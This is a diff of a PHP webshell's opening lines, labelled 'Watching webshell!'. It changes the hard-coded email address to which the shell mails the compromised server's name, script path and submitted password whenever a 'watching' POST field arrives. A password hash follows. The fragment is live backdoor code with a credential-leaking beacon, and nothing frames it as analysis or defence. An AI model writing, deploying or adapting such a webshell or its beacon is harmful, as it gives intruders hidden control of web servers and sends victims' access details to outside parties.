@@ -1,7 +1,7 @@
 <?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hello.paypal2019@gmail.com', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('mobgame.vn@gmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
 $▛ = "9ac1a482032a70e2925fa60e31b1ec9e";
